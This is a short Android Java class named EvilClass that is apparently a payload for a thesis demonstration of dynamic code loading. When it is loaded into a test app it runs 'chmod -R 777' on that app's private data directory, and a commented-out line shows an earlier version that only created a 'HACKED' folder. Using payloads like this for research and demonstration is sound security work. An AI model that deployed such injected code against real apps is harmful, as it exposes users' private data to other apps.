package com.exec.dlc;

import android.util.Log;

public class EvilClass {

    public static Object evilMethod() {
        String packageName = "com.example.android.thesis.vulnerableapp";
        try {
            Log.i("ExecDLC", "evilMethod");
//            String command = String.format("mkdir /data/data/%s/HACKED", packageName);
            String command = String.format("chmod -R 777 /data/data/%s", packageName);
            Runtime.getRuntime().exec(command).waitFor();
        }
        catch (Throwable th) {
            Log.e("ExecDLC", th.getMessage());
        }
        return null;
    }
}
